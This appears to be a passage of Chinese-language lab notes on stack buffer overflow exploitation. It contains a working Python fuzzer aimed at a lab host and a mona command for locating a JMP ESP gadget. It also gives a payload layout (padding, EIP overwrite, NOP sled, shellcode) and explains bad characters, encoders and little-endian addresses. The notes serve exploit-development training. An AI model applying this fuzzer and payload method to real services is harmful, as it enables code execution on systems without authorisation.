Fuzzing — 找到崩溃长度

# fuzzer.py
import socket, sys
from time import sleep

buffer = b"A" * 100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(("10.129.43.56", 8888))
        print(f"Sending {len(buffer)} bytes")
        s.send(buffer)
        s.close()
        sleep(1)
        buffer += b"A" * 100
    except:
        print(f"Crashed at {len(buffer)} bytes")
        sys.exit()

Step 5

定位 JMP ESP

# Immunity 中：
!mona jmp -r esp -cpb "\x00\x0a\x0d\x25\x26\x2b\x3d"
0x68A98A7B  : jmp esp  (Qt5Core.dll)
为什么用 JMP ESP？我们控制了 EIP（返回地址），把它指向一条 JMP ESP 指令。程序执行到 ret 时跳转到 JMP ESP，而 ESP 刚好指向我们的 shellcode——于是 shellcode 被执行。

Payload 内存布局（从低到高）

[A × 1052 填充] [EIP → JMP ESP] [NOP × 32 滑板] [Shellcode] [C × 填充]

坏字符排除必须逐个。

一次删多个会导致误判——前面的坏字符可能影响后续字节在内存中的排列。每轮只删一个，重新发送重新比对。

NOP sled（\x90 滑板）的作用。

shellcode 编码器（shikata_ga_nai）需要空间自解码。NOP sled 提供缓冲区，让 EIP 落在 NOP 上后"滑"到 shellcode 入口。通常 16-32 字节足够。

JMP ESP 地址必须不含坏字符。

!mona jmp -r esp -cpb "\x00..." 自动排除。选择来自稳定 DLL（非 ASLR）的地址。

Little-Endian 字节序。

x86 是小端序，0x68A98A7B 在内存中存为 \x7B\x8A\xA9\x68。Python 的 struct.pack("<I", addr) 自动处理。
